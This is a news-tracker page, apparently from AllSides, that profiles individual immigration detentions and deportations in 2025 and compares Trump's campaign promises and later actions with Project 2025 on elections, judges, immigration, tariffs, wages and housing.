Green Card Holder - Victor Avila

Detained in the U.S.

Latest Update: Avila is being held in a detention center in Bakersfield, California. His deportation hearing is scheduled for June 15. 

Immigration Status: Avila immigrated to the US legally in 1967 and has held a Green Card for the past 58 years.

Reason for Detention: Avila was arrested on his return home from Asia, where he had been visiting his son, who serves in the US Air Force. DHS has not released a statement on his detention or deportation trial. Avila's daughter, Carina Mejia, said in 2009 he was charged with two misdemeanors: driving under the influence and drug possession. He paid a fine and served a few months in prison at the time. 

Opposition: ""Two misdemeanors. Served all his time, paid all he had to pay. Since then, he has been a good man and a hard worker. Hasn't gotten into trouble, not one time. He's dedicated himself to his family... I want my dad back. I want my dad home,"" his daughter said.

Pending Special Immigrant Visa (SIV) - Sayed Naser

Detained in the U.S.

Latest Update: 


	Naser was placed into expedited removal.
	Naser was arrested and taken into federal custody on June 12. 


Immigration Status: Naser was legally paroled into the US in 2024 and entered using the CBP One app through a legal port of entry. He had a pending SIV application, as Naser reportedly worked with the US military in Afghanistan for three years and feared he would be tortured and killed if he returned to his country. Many Afghans who worked with the US military during the 20 years it remained in Afghanistan have been accepted into the US on Temporary Protected Status (TPS) and SIVs; however, the Trump administration has removed TPS for some migrants.

Reason for Detention: Naser was arrested at his asylum hearing at an immigration court in San Diego. DHS released a statement saying, ""On June 12, ICE officers arrested Sayed Naser Noori, an Afghan national. He entered the U.S. unvetted via the CBP One app under the previous administration in 2024. There is nothing in his immigration records indicating that he assisted the U.S. government in any capacity. All of his claims will be heard by a judge. Any Afghan who fears persecution is able to request asylum.""

Opposition: Naser wrote in his declaration to U.S. Citizenship and Immigration Service, ""While collaborating with U.S. forces, I faced numerous threats and attacks. Several times, I narrowly escaped harm, but over seven of our vehicles were burned by the Taliban... To them, anyone or any company working with foreign forces is considered an infidel and a legitimate target for killing. For this reason, after the fall [of the] government, it became impossible for us to live in Afghanistan. We had to leave the country by any means necessary."" The group Unite for Veterans denounced Naser's detainment, saying, ""Our Afghan allies protected us when we needed them... Now it is our turn to look after them.""

	A federal judge ordered the Trump administration to provide the legal basis for its attempt to deport Mahmoud Khalil on May 7.
	New Jersey Federal Judge Michael Fabiarz decided on April 29 to retain jurisdiction over the case, allowing Khalil's challenge to his detention to move forward. 
	Khalil is currently detained in Louisiana. On April 17, he wrote an op-ed for Washington Post (Lean Left bias), saying his detainment showed how ""the most basic human instinct, to protest shameless massacre, is being repressed by obscure laws, racist propaganda and a state terrified of an awakened public."" On April 12, an immigration judge ruled that Khalil can be deported. 


Immigration Status: Khalil has a green card, making him a legal US resident.

Reason for Deportation: Khalil played a key role in pro-Palestinian protests at Columbia University, which Secretary of State Marco Rubio characterized as antisemetic. Government officials have accused Khalil of supporting Hamas terrorism. Under the Immigration and Nationality Act of 1952, citizen deportation is legal if there is “reasonable ground to believe [an immigrant] would have potentially serious adverse foreign policy consequences” for the US.

Opposition: Those against Khalil’s deportation argue that his involvement in protests is protected speech and deporting someone based solely on their political views is illegal. They argue the government lacks evidence of any connections to terrorist organizations and attacks on Palestinian speech are based in political retribution.

Visa/Permit to Work (Status Unknown) - Juan Vita Leite Pinto

Detained in the U.S.

Latest Update: Vita Leite Pinto has been in ICE custody at the Eloy Detention Center in Arizona since Memorial Day weekend.

Immigration Status: Vita Leite Pinto began the process of applying for citizenship when he came to the US on a visitor Visa four years ago. He and his partner, US citizen Ricardo Dominguez, have since decided to get married and have begun the process to get Vita Leite Pinto a green card. Vita Leite Pinto was awaiting his first interview, which had already been scheduled, when he was detained. His partner reported that he does not have a criminal record.

Reason for Detention: Vita Leite Pinto was stopped by ICE agents while sightseeing at the Grand Canyon over Memorial Day Weekend. He was told the Florida ID he presented was insufficient and was detained.

Opposition: Dominguez, Vita Leite Pinto's partner, said ""He doesn't like being in there. He wants to work. He enjoys work. He enjoys his job, and being out, getting to know this country...He just wanted to go back to his job and working on us getting married.""

Visa/Permit to Work (Status Unknown) - Mario Guevara

Detained in the U.S.

Latest Update:


	Guevara has been moved to solitary confinement in an ICE detention center near the border of Florida.
	Guevara remains in ICE custody nearly a month after his arrest despite being granted bond.
	All charges, which included unlawful assembly, obstruction of a law enforcement officer, and being a pedestrian on or along the roadway, against Guevara have been dropped.
	Guevara was transferred to ICE custody on June 18.
	Guevara was livestreaming the protest on June 14 and captured his own arrest on video. He announced to the arresting officers that he was a member of the media.


Immigration Status: Guevara reportedly entered the US on a tourist visa in 2004 after receiving death threats for his political journalism in El Salvador. He is not a legal permanent resident of the US, but his attorney said he had a permit to remain and work in the US.

Reason for Detention: Guevara was arrested at a “No Kings” protest outside Atlanta, Georgia for alleged obstruction of officers and unlawful assembly. Though a state judge granted Guevara release without bail, ICE requested he remain in custody because of his immigration status.

Opposition: Guevara's attorney, Giovanni Diaz, said, “He's been doing this type of work for 20-plus years, and now he gets detained. It's concerning. He's a member of the press. And he doesn't seem to be committing any crime.” Katherine Jacobsen, the program coordinator overseeing the US for the Committee to Protect Journalists, said the request to extend his detention “could lead to Guevara's deportation” and “is a crude form of censorship.”

		ICE officials arrested Kilmar Abrego Garcia on Monday, during a check-in at an ICE office in Maryland. Though DHS officials announced plans to begin Abrego Garcia’s deportation to Uganda, US District Judge Paula Xinis ruled on Monday that Abrego Garcia will remain in the US until the legality of his deportation is settled
	
	
		Abrego Garcia was released on August 22 from the Tennessee jail where he was being held. He reuinited with his family in Maryland after 160 days of separation.
	
	
		A federal judge instructed the Trump administration to moderate their comments about Kilmar Abrego Garcia in order to ensure he receives a fair trial.
	
	
		A Justice Department attorney said the US would initiate deportation proceedings against Kilmar Abrego Garcia if he is released before his trial.
	
	
		Abrego Garcia said he was physically and psychologically tortured in the El Salvador mega-prison known as CECOT.
	
	
		A key witness in the case against Kilmar Abrego Garcia agreed to cooperate with the government on the case in exchange for protection against his own deportation. The witness, Jose Ramon Hernandez Reyes, had been convicted of smuggling migrants, illegally re-entering the US after being deported, and deadly conduct.
	
	
		Abrego Garcia's attorneys asked the judge to delay his release out of concern that ICE will attempt to deport him before his trial.
	
	
		A federal judge ruled Kilmar Abrego Garcia is eligible for release as he awaits trial, saying the government ""failed"" to prove that he is a danger to society warranting continued detainment. 
	
	
		The Justice Department argued that Garcia's lawsuit against the government must be dismissed, as he was returned to the US and there is no longer an ongoing controversy.
	
	
		At his arraignment in Tennessee on June 13, Kilmar Abrego Garcia plead not guilty to charges of illegally ferrying undocumented immigrants within the US.
	
	
		Kilmar Abrego Garcia is scheduled to appear in court in Nashville on June 13 for a formal arraignment of his charges.
	
	
		Abrego Garcia will be returned to the US to face criminal charges of conspiracy to ""unlawfully transport illegal aliens for financial gain and unlawful transportation of illegal aliens for financial gain."" He allegedly helped transport thousands of migrants from Central America into the US illegally over several years.
	
	
		A federal judge ordered the release of some documents pertaining to Abrego Garcia's case, though the documents revealed little new information.
	
	
		Abrego Garcia's lawyers filed an opposition to the government's motion to dismiss his case. The government has two weeks to respond to this opposition before the judge makes a final decision.
	


Immigration Status: Abrego Garcia was a temporary protected US resident. He arrived in the US illegally in 2011 as a 16-year-old. In 2019, an immigration judge granted him ""withholding of removal"" status over purported threats to his life from gang violence in El Salvador. The ruling barred the government from sending Abrego Garcia to El Salvador specifically, but technically allowed for him to be deported to a different country.

Reason for Deportation: Trump administration officials said Abrego Garcia was sent to an El Salvadorian prison due to an “administrative error,” but continue to describe him as a member of the MS-13 gang. “This was just one of those examples of an individual that is a MS-13 gang member, multiple charges and encounters with the individuals here, trafficking in his background, was found with other MS-13 gang members—very dangerous person, and what the liberal left and fake news are doing to turn him into a media darling is sickening,” said Homeland Security Secretary Kristi Noem. 

Opposition: Some members of Abrego Garcia’s family contend that he has no criminal record and that there’s no evidence of him being gang-affiliated.

Immigration Status: DHS spokesperson Tricia McLaughlin said the State Department revoked the visas of all six members of Soliman's immediate family. Mohamed Soliman was in the US without authorization after overstaying a tourist visa.

Reason for Detention: State Secretary Marco Rubio wrote on X, ""In light of yesterday’s horrific attack, all terrorists, their family members, and terrorist sympathizers here on a visa should know that under the Trump Administration we will find you, revoke your visa, and deport you.""

Latest Updates: Ambrocio Mendez was detained at an ICE office in Tampa, Florida on April 17 while attending an immigration check-in, which he had been attending annually for the past 12 years.

Immigration Status: According to Newsweek (Center bias), Ambrocio Mendez had a court-issued 'stay of removal,' which is ""a form of supervision allowing him to remain in the country despite a deportation order.""

Reason for Detention: DHS said that Ambrocio Mendez was previously convicted of driving without a license and deported after he had re-entered the US without authorization.

Opposition: ""It's truly horrible. These people are going to their appointments to make it right. If they were the 'real criminals' Trump is supposedly deporting, they wouldn't be representing themselves to a judge,"" his daughter Ashley Ambrocio told Newsweek. ""My father's lawyer told my dad the chance was high he could be detained, but my father decided to go because he knew he was doing the right thing and obeying.""

		Petrova was indicted on additional charges two weeks after she was released on bail. The grand jury indicted her on charges of concealing a material fact, false statements, and smuggling goods into the country.
	
	
		Kseniia Petrova was released on bail on June 12 by a Boston magistrate judge.
	
	
		On May 28, a federal judge granted bail for Petrova, but she remains in custody.
	
	
		A federal judge ordered Petrova to be transferred from a detention center in Louisiana to Massachusetts, where she was charged.

		Petrova claims she ""never provided false information to any government official” and instead her statements to officials were misunderstood and inaccurately reflected.
	


Immigration Status: Petrova held a J-1 scholar visa, which was canceled after her detention.

Reason for Detention: Petrova was detained in February 2025 at Boston's Logan Airport after reportedly failing to declare samples of frog embryos to be used in her scientific research. She is being held at an immigrant detainment center in Louisiana.

Opposition: “It appears to be part of a broader effort to create an unwelcoming and hostile environment for noncitizens,” her lawyer said.

Unauthorized - O.C.G.

Removed from the U.S.

Latest Updates:


	O.C.G. was returned to the US on Wednesday and is expected to be taken into federal custody.
	A government filing reported on May 28 indicates the Trump administration granted O.C.G ""Significant Public Benefit Parole,"" a form of parole that will allow him to re-enter the US. Justice Department officials have said they are securing a flight for O.C.G.
	The Department of Homeland Security told the court in March that O.C.G. said he was not afraid of returning to Mexico. In May, the DHS retracted this filing, saying it was an ""error"" and that they could not identify an officer who asked or heard an answer from O.C.G. on this matter.
	O.C.G was deported to Mexico where he was told he could apply for asylum while waiting in detention or return to Guatemala. He chose to return to Guatemala.
	At a hearing in February, a judge assured O.C.G. that he would not be deported to Mexico, where he reportedly was raped and held hostage prior to entering the US.
	Afte arrest, O.C.G. was granted a witholding of removal which protected him from being removed back to Guatemala, where he was from. His lawyers argued that he had faced multiple death threats in Guatemala due to his sexuality.
	O.C.G. reportedly entered the US without authorization in 2024. He was then arrested by Border Patrol.


Reason for Deportation: The Trump administration has not commented on their deportation.

Opposition: In a follow-up filing, O.C.G. wrote that he is “living in hiding, in constant panic and constant fear” in Guatemala. “I can’t be gay here,” he said in the filing, “which means I cannot be myself.” Judge Brian Murphy called this error troubling, writing that “the Court was given false information, upon which it relied, twice, to the detriment of a party at risk of serious and irreparable harm.”

Asylum Seeker - Andry Hernandez Romero

Removed from the U.S.

Latest Updates: 


	Romero told NBC News (Lean Left bias) that CECOT prison staff sexually abused him and forced him to perform oral sex on another person, amongst other physical and psychological abuses.
	Romero, along with the other migrants being held in El Salvador's megaprison CECOT, was released back to Venezuela in exchange for the release of 10 Americans and US permanent residents imprisoned in Venezuela.
	Rep. Ritchie Torres (D-NY) donated to a fund demanding the release of Andry Hernandez Romero. On June 9, Torres and 51 other Democratic lawmakers signed a letter to State Secretary Marco Rubio demanding Romero's immediate release.
	Over 300 protesters gathered outside the Supreme Court on June 6 demanding the return of Andry Hernández Romero from CECOT.


Immigration Status: Hernandez Romero entered the US as an asylum-seeker with an appointment to seek protection in the US from persecution, according to his lawyer. On May 27, an immigration judge dismissed his asylum claim.

Reason for Deportation: Immigration officials deported Hernandez Romero and more than 100 other Venezuelans on the grounds that they're members of Tren de Aragua, a violent criminal gang.

Opposition: ""He has a strong claim. He was detained at entry because ICE alleged his tattoos are gang related. They are absolutely not,"" his lawyer said. ""He is a makeup artist who loves theater. He is a gay man. He is close to his family.""

Some earlier reports referred to Romero as Andrys Cedeno-Gil.

Unknown - Eight Migrants Deported to South Sudan

Removed from the U.S.

Latest Updates:


	The supreme court has allowed the deportation of the eight migrants deported to South Sudan to proceed after they have been held at a military base in Djibouti for weeks.
	On May 21, Judge Brian Murphy ruled that their removal violated his April order that migrants being deported must be given written notice of what country they are being deported to in a language they understand as well as meaningful opportunity to argue their case to an immigration judge if they fear persecution or torture in that country. Murphy ordered the Trump administration to give these migrants the opportunity to challenge their removal either in the US or Djibouti, where they were being kept at the time.
	On May 19, the US informed eight individuals they were being deported to South Sudan after previously telling them they would be removed to South Africa.


Reason for Deportation: All eight of the migrants deported to South Sudan have been convicted of crimes including murder, robbery, or sexual assault.

Opposition: Murphy wrote, ""To be clear, the Court recognizes that the class members at issue here have criminal histories...But that does not change due process.""

	Prada Vasquez, along with the other migrants being held in El Salvador's megaprison CECOT, was released back to Venezuela in exchange for the release of 10 Americans and US permanent residents imprisoned in Venezuela.
	Prada was removed to the El Salvador prison Centro de Confinamiento del Terrorismo.
	According to the New York Times (Lean Left), Prada told a friend on March 15 that he was being housed in Texas with other detainees expected to be repatriated to Venezuela.
	On Feb, 27, a judge ordered him to be removed from the US.
	On Jan. 15, Prada attempted to re-enter the US from Canada after reportedly entered Canada by accident making a wrong turn while working his delivery job. He was then taken into custody.


Immigration Status: It’s unclear what his exact legal status in the US was; Prada reportedly entered the US through a port of entry using the CBP One app in November of 2024. He was released into the US under Biden administration policies.

Reason for Deportation: The Trump administration reports that Prada was a confirmed member of Tren De Aragua. The Department of Homeland Security website states that ""Prada Vasquez was living and working in the U.S. illegally, he was a member of a criminal gang designated as a terrorist organization, and was deported with full compliance with American law.""

Opposition: Prada's name does not appear on the list of 238 men who were deported to El Salvador in March, nor does he appear in photos or videos released by DHS. “Ricardo’s story by itself is incredibly tragic — and we don’t know how many Ricardos there are,” said Ben Levey, an attorney with the National Immigrant Justice Center who has attempted to locate Prada.

	The Department of Homeland Security released Immigration and Customs Enforcement records of Gutiérrez's arrests, including criminal posession of a loaded firearm on school grounds. The administration also claims he is associated with Tren de Aragua, though they have not released records demonstrating this.
	The 19-year-old Venezuelan’s family is pleading for his transfer back to the US from El Salvador.


Immigration Status: It’s unclear what his exact legal status in the US was; Gutiérrez reportedly entered the US illegally in 2023 and was arrested by US Border Patrol agents. He was then released and awaiting his immigration hearing scheduled for February of 2027.

US Citizen - 2-year-old child ""VML""

Removed from the U.S.

Latest Update:


	On May 10, the family voluntarily dismissed their lawsuit against the Trump administration.
	A federal judge expressed “strong suspicion” that Immigration and Customs Enforcement (ICE) may have deported a 2-year-old US citizen without “meaningful process” on Friday. The child is referred to as ""VML"" in court documents.


Immigration Status: VML was born in the US and therefore is a US citizen.

Reason for Deportation: The Department of Homeland Security (DHS) said the mother wanted to take her children with her when she was deported to Honduras. An opposition brief from the Department of Justice (DOJ) said VML was lawfully in her mother’s custody and the Constitution was not violated.

Opposition: “The Government contends that this is all okay because the mother wishes that the child be deported with her. But the Court doesn’t know that,” the judge wrote.

	On April 30, Mahdawi was released per order by a federal judge in Vermont. On April 29, Mahdawi spoke out for the first time from detention: ""While I still know deeply that this is a level of injustice that I am facing, I have faith. I have faith that justice will prevail.""


Immigration Status: Mahdawi became a legal permanent US resident in 2015, according to a file from his court case. He was detained at a citizenship appointment.

Reason for Detainment: It’s suspected to be in connection with his pro-Palestine activism on Columbia University’s campus.

Opposition: “This is immoral, inhumane, and illegal,” three lawmakers from Vermont, where Mahdawi was arrested, said in a statement. “Mr. Mahdawi, a legal resident of the United States, must be afforded due process under the law and immediately released from detention.”

President Donald Trump made a lot of promises on the 2024 campaign trail. Which have been kept, and which are unfulfilled?

AllSides is tracking the latest updates on Trump's campaign promises and ensuing legislation. We're also tracking how closely these actions align with Heritage Foundation's (Right bias) Project 2025. We've included mentions of Project 2025 because parts of it align with Trump's stated goals and actions. He has publicly distanced himself from the project.

January 6, 2021

Election Integrity

During his campaign: President Donald Trump said he would pardon January 6 convicts on his first day in office. He said of the Capitol Riot, in 2024, “We didn’t have guns. The others had guns, but we didn’t have guns. And when I say we, these are people that walked down - this was a tiny percentage of the overall which nobody sees and nobody, nobody shows. But that was a day of love… They didn't come because of me… They thought the election was a rigged election, and that’s why they came.”

What Project 2025 said: Project 2025 includes no specific stances on the January 6, 2021 Capitol Riot.

Voter Eligibility & Fraud

Election Integrity

During his campaign: President Donald Trump referred to the 2020 presidential election as “rigged” and claimed widespread voter fraud had occurred. He was critical of mail-in ballots and said, “Anytime you have a mail-in ballot, there is going to be massive fraud.” He also claimed – unfoundedly – that unauthorized immigrants were being allowed into the US to vote against him. 

What Project 2025 said: Project 2025 calls to further enforce the criminalization of voter fraud offenders and increase the security of voting, particularly pertaining to citizenship screenings.

Since election day: 


	Trump announced plans in August to eliminate mail-in ballots and voting machines via executive order ahead of the 2026 midterm election.
	Trump called for a special prosecutor to investigate the 2020 presidential election, claiming in June that he won in a ""LANDSLIDE!"" 
	He signed an executive order that would've required proof of citizenship for federal voter registration, but it was blocked by a federal judge in June.
	The Trump administration filed a lawsuit against North Carolina in late May, alleging that the state maintained inaccurate voting records.
	Trump signed an executive order in March to “enforce the Federal prohibition on foreign nationals voting in Federal elections.” The order requires proof of citizenship to vote and enforces the criminalization of voting violations. 
	The Department of Homeland Security (DHS) cut all funding for the Election Infrastructure Information Sharing and Analysis Center in February.

Election Certification & Term Limits

Election Integrity

During his campaign: Prior to his presidential election in 2016, Donald Trump called for congressional term limits, though he did not further that stance during his presidency or future campaigns. Trump opposed the election certification of former President Joe Biden in 2020 due to voter fraud claims. He did not call to change election certification policies during his 2024 presidential campaign.

What Project 2025 said: Project 2025 calls to increase security and enforcement surrounding election laws, but no direct alterations to election certification or term limits are included.

Since election day:


	Trump said in early August that he would “probably not” run for a third term.
	Trump accused former President Barack Obama and his administration of “treason” in July due to a declassified report containing information about Russian interference in the 2016 election. FBI Director Kash Patel reportedly uncovered thousands of documents pertaining to the investigation in secret “burn bags” later that month.
	Trump said “there are methods” for seeking a third term, in March. No legislative action has been taken to do so, though he asserted he was “not joking.”

Activist Judges

Criminal Justice

During his campaign: Trump reportedly planned to appoint more conservative judges, also looking to the Supreme Court to fill potential vacancies. 

What Project 2025 said: “The White House Counsel’s office… should function more as an activist yet ethical plaintiffs’ firm that advocates for its client—the Administration’s agenda—within the limits imposed by the Constitution and the duties of the legal profession.”

Since election day: 


	The Justice Department (DOJ) reportedly filed a complaint against US District Court Chief Judge James E. Boasberg for “making improper public comments about President Donald J. Trump to the Chief Justice of the United States and other federal judges that have undermined the integrity and impartiality of the judiciary.”
	The Department of Homeland Security (DHS) accused District Court Judge Amy Baggio of unfairly acting on gender “fanaticism” in July by releasing a transgender unauthorized immigrant from US custody.
	The Trump administration sued all 15 federal judges in Maryland in late June, after deportation efforts in the state were blocked.
	Trump selected five conservative lawyers as federal judicial nominees in early May. He wrote on Truth Social, “Our Court System is not letting me do the job I was Elected to do. Activist judges must let the Trump Administration deport murderers, and other criminals who have come into our Country illegally, WITHOUT DELAY!!!”
	Among criticisms from fellow Republicans, Trump suggested investigating judges for allegedly misusing their power, in February. 
	Trump selected conservative Pam Bondi as US Attorney General. She was confirmed by the Senate in early February.

Authorized & Unauthorized Entry

Immigration

During his campaign: President Donald Trump supported limits on legal immigration and visas, as well as raising visa fees to fund the border wall. He opposed the H-1B visa program, which allows companies to employ foreign workers in specialized industries. 

What Project 2025 said: Project 2025’s immigration control priorities were described as:


	Mass deportations and rapid removals nationwide
	Militarized border enforcement
	Expanded detention and reduced legal protections
	Elimination of relief programs for Dreamers, TPS holders, and others
	Deep involvement of local law enforcement in immigration enforcement
	Efforts to end birthright citizenship
	Centralization of immigration authority under the Department of Homeland Security (DHS)


Since election day: 


	Trump announced in late August that he would allow 600,000 visas for Chinese students to attend US universities. However, the Trump administration released a proposal in late August to “limit the amount of time that [foreign students] are allowed to remain in the United States without additional screening and vetting.”
	The Defense Department announced in August that the Pentagon is inviting civilian volunteers to temporarily support Immigration and Customs Enforcement and Customs (ICE) and Border Protection (CBP) operations.
	Secretary of Homeland Security Kristi Noem announced in August that 1.6 million unauthorized immigrants have been deported from or left the US since Trump’s inauguration.
	The US State Department may require tourist and business visa applicants from high-risk countries to post a bond of up to $15,000, according to an announcement in early August.
	CBP released an app on which unauthorized immigrants can submit an intent to depart. Following their self-deportations, the migrants may reportedly submit for legal status in the US.
	The Trump administration announced in July that unauthorized immigrants will not be eligible for bond hearings while contesting deportation proceedings.
	A federal judge blocked the Trump administration's restrictions on asylum seekers in early July, arguing the administration did not have constitutional authority to impose the limits.
	CBP reported that zero unauthorized migrants were released into the US in May, and border crossings are down 93% from May 2024.
	The Trump administration directed US embassies and consular sections in late May to pause student visa interviews while vetting processes are reevaluated.
	The administration announced plans to 'aggressively' revoke visas from Chinese students, in late May, ""including those with connections to the Chinese Communist Party or studying in critical fields."" It also attempted to bar Harvard University from accepting international students but was blocked by a federal judge.
	Groups of Afrikaner refugees were reportedly granted asylum in the US in May, due to alleged racial discrimination in their home country of South Africa.
	Arrests along the southern border have fallen significantly. Follow the latest controversial deportations and detainments under the Trump administration.
	Trump said in January that he hadn’t changed his stance on visas, saying, “We need smart people coming into our country. We need a lot of people coming in. We're going to have jobs like we’ve never had before,” and “I’ve always liked the visas, I have always been in favor of the visas. That’s why we have them.” 
	In February, the Trump administration returned to the “Interview Waiver Program” from his first term, allowing some visa applicants to bypass an in-person interview. 
	DHS began revoking some student visas across the US in late March for unspecified reasons.

The Border Wall

Immigration

During his campaign: President Donald Trump pledged to finish building a wall at the southern border. Trump promised to “seal the border” if elected and said that he would order a “massive increase” in border patrol agents to tighten surveillance at the border. Additionally, Trump called to move “thousands of Troops currently stationed overseas” to the southern border, and deploy the U.S. Navy to help secure the border. 

What Project 2025 said: It advocates “aggressively constructing a wall on our southern border.”

Since election day: 


	The DHS reportedly bypassed environmental laws in the southern US to further its border initiatives.
	Secretary of Homeland Security Kristi Noem said in August that the US-Mexico border wall will be painted black – per Trump’s request – to make it hotter and more difficult to climb.
	A company is set to return up to $350 million in construction materials to the Trump administration at a low cost, after former President Joe Biden halted border wall construction and relinquished the materials.
	The Pentagon announced in early July that the US Navy will control a new military border zone covering 140 miles of the US-Mexico border in Arizona.
	Construction of the border wall in Arizona and New Mexico was approved for 36 miles of expansion in early June.
	To secure the northern border, surveillance and other technology are reportedly being amplified as opposed to a physical wall being constructed.
	Trump's ""big, beautiful bill"" is set to allot $50 billion to increase security with fences across the US-Mexico border. It would reportedly increase wall construction and fund water buoy blockades as well. 
	The US-Mexico border wall is under active construction, according to the Texas Facilities Commission. Trump reportedly hopes to have the physical border wall completed by 2029, and 85 miles are set to be erected in 2025. 
	Thousands of active-duty troops have reportedly been sent to the border. The Army said it will provide “logistical support” for US Customs and Border Protection rather than prioritizing arrests.

Sanctuary Cities

Immigration

During his campaign: President Donald Trump called to cut federal funding for sanctuary jurisdictions. An executive order he signed during his first term promised to “ensure that jurisdictions that fail to comply with applicable Federal law do not receive Federal funds.”

What Project 2025 said: Calls to “withhold federal disaster relief funds granted by the Federal Emergency Management Agency (FEMA) should state or local governments refuse to abide by federal immigration laws.""

Since election day: 


	Immigration and Customs Enforcement (ICE) is reportedly set to expand policing and deportations in New York, Seattle, Portland, Chicago, and Los Angeles – all DOJ-designated sanctuary jurisdictions.
	Attorney General Pam Bondi rescinded sanctuary city protections in Washington, D.C., in August.
	ICE director Todd Lyons promised to “flood” Boston, Mass. with agents after Mayor Michelle Wu of Boston refused federal direction to end sanctuary policies.
	The US Department of Justice (DOJ) labelled 35 sanctuary city jurisdictions in early August, claiming that they are obstructions of justice.
	Louisville, Kentucky dropped its sanctuary city policies in July after receiving a “strong written warning” from Attorney General Pam Bondi.
	The Trump administration blamed New York City’s sanctuary policies for the July shooting of a Customs and Border Protection (CBP) officer. The Justice Department (DOJ) is suing the city and some of its officials due to the event.
	The DOJ filed a lawsuit against Los Angeles in late June, claiming the city's sanctuary policies are unconstitutional and obstruct ICE.
	""I want ICE, Border Patrol, and our Great and Patriotic Law Enforcement Officers, to FOCUS on our crime ridden and deadly Inner Cities, and those places where Sanctuary Cities play such a big role,"" Trump stated in June. 
	The Department of Homeland Security (DHS) published a list of ""sanctuary jurisdictions"" in late May, advising the jurisdictions' adherence to federal immigration legislation.
	Four sanctuary cities in New Jersey were sued by the Trump administration in May, accused of upholding policies that protect unauthorized immigrants.
	Trump has not yet cut funding for sanctuary cities, but said he would if their administrations refused to comply with policy changes. He has, however, allowed for unauthorized migrant arrests in schools and churches.

Deferred Action for Childhood Arrivals (DACA)

Immigration

During his campaign: 


	President Donald Trump called for “an orderly transition and wind-down of DACA, one that provides minimum disruption.” He planned to give Congress a delay to come up with a “permanent legislative solution,” arguing that DACA recipients would unfairly use healthcare that would otherwise be granted to American citizens. 
	Trump also suggested that “anchor babies” are not covered by the Fourteenth Amendment and that parents should come into the U.S. legally in order to be granted government services. 


What Project 2025 said: Calls to end Deferred Action for Childhood Arrivals (DACA).

Since election day: DACA remains active at this time, but the US Citizenship and Immigration Services (USCIS) has reportedly paused the processing of new applications. Department of Homeland Security (DHS) Assistant Secretary Tricia McLaughlin said in late July, “Illegal aliens who claim to be recipients of [DACA] are not automatically protected from deportations… DACA does not confer any form of legal status in this country.”

Citizenship & Deportations

Immigration

During his campaign: Former President Donald Trump said he wanted to provide a pathway for noncitizens who graduate from US colleges to get green cards, after undergoing an “aggressive vetting process.” Trump stated that he aims to end birthright citizenship if elected; however, he had also proposed a pathway to citizenship for unauthorized youth immigrants, in exchange for tighter restrictions on legal immigration and greater funding for border security.

What Project 2025 said: “End birthright citizenship"" and allow more mass deportations.

Since election day: 


	Immigration and Customs Enforcement (ICE) is reportedly planning to increase immigration policing in Chicago toward the end of August or early September.
	The Trump administration released a proposal in late August to “limit the amount of time that foreign students, professors, physicians, and other visa holders are allowed to remain in the United States without additional screening and vetting.”

Tariffs & Trade

Economy & Taxes

During his campaign: Trump pledged to impose a new universal baseline tariff of 10% on all imports to the United States, regardless of country of origin, and promised even higher tariffs on Canada, Mexico, China, and other countries.

What Project 2025 said: “Strategically expand tariffs to all Chinese products and increase tariff rates to levels that will block out ‘Made in China’ products, and execute this strategy in a manner and at a pace that will not expose the U.S. to lack of access to essential products like key pharmaceuticals.”

Since election day: Trump has announced sweeping tariffs, leading to stock market fluctuation and negotiations with dozens of countries. 


	Trump imposed 50% tariffs on India in late August.
	The US reportedly agreed to limit tariffs on various European Union (EU) imports to 15% in August.
	The US and China agreed to pause most tariffs on one another for 90 days, on May 12th. Trump extended the pause for an additional 90 days on August 12th.
	Trump’s widespread plan to impose new tariff rates on nearly 70 countries began in early August.
	Trump’s tariffs are facing a federal court appeal ahead of their August 1st deadline.
	US Gross Domestic Product (GDP) grew 3% in the second quarter (Q2) of 2025, surpassing economists’ expected growth and following a first-quarter contraction.
	Trump announced in late July that a US-EU trade deal will impose a 15% tariff on the US for most European goods in exchange for a $600 billion EU investment into the US economy, increased EU purchasing of US military equipment, and a $750 billion EU purchase of US energy.
	Trump announced a trade agreement with Japan in July that includes a $550 billion investment into the US and decreased reciprocal tariffs.
	In July, Trump threatened Russia with tariffs of 100% if a Russia-Ukraine peace agreement is not reached within 50 days. The Russian government called the threat “unacceptable” and escalated attacks on Ukraine.
	Trump announced a 50% tariff on Brazil in July. 
	He said in early July, “If they have to bring the pharmaceuticals into the country, the drugs and other things into the country, they’re going to be tariffed at a very, very high rate, like 200 percent.""
	The US reportedly earned $106 billion from tariffs, from Trump's inauguration to late June.
	The US and China reached a trade deal in late June, according to Trump. Details were not disclosed at the time of the announcement.
	Trump and Canadian Prime Minister Mark Carney reportedly agreed to settle a trade deal in 30 days, on June 16th. Trump halted all trade negotiations with Canada on June 27th due to the country's impending 3% digital services tax on American tech companies. The Canadian government removed the tax just before it was supposed to take effect, prompting resumed trade talks. Trump and Carney are now expected to reach a trade deal by July 21st.
	The Census Bureau reported that May's international trade in goods increased by about 11%.

Minimum Wage

Economy & Taxes

During his campaign: 


	When asked, he signaled some openness to considering an increase, stating in a December 2024 NBC interview that the current rate of $7.25 per hour is “a very low number” and that “there is a level at which you could do it, absolutely.” However, he declined to commit to a specific amount or timeline, adding he would “want to speak to the governors” and emphasizing concerns about negative impacts on small businesses.


What Project 2025 said: Proposed repealing the requirements for federally-funded projects to have project labor agreements (PLAs) and pay the prevailing wage in the region.

Since election day: 


	Republican Sen. Josh Hawley (MO) proposed a bill in June that would raise the federal minimum wage from $7.25 per hour to $15. The bill has reportedly received bipartisan support. Trump was unclear about whether or not he would support the move, saying, ""That's interesting that Josh did that. You have to think about that one.""
	In March 2025, Trump signed an executive order revoking a Biden-era order that set a $15-per-hour minimum wage for federal contract workers, lowering the minimum wage for hundreds of thousands of workers on federal contracts back to $7.25 per hour.
	Alaska, California, Florida, Michigan and Oregon enacted minimum wage increases for 2025.

Affordable Housing

Economy & Taxes

During his campaign: 


	Trump pledged to make underused federal land available for residential development, aiming to boost housing supply and lower costs.
	Trump proposed building up to 10 new “Freedom Cities” on federal land, designed as futuristic urban centers to expand housing options and homeownership for young people and families.


What Project 2025 said:


	Criticizes the growth of federal housing programs.
	“Although housing supply is a problem in the United States, constructing more units at the low end of the market will not solve the problem,” suggesting developers “can deliver at more efficient cost new units that will allow for greater upward mobility of rental and ownership housing stock and better target increased construction of mid-tier rental units.”


Since election day: 


	US home sales continue to depreciate as prices continue to rise.
	Trump said in July that he is considering ending capital gains taxes on home sales.
	Trump's ""big beautiful bill"" is set to expand the low-income housing tax credit and increase tax breaks through the raised State and Local Tax (SALT) deduction.
	Inventory levels of US housing reportedly increased 20% in March 2025 from March 2024, though a housing shortage is still prevalent – particularly for middle-class Americans.
	Trump signed an executive order in May to establish a housing center for veterans in Los Angeles, Calif.
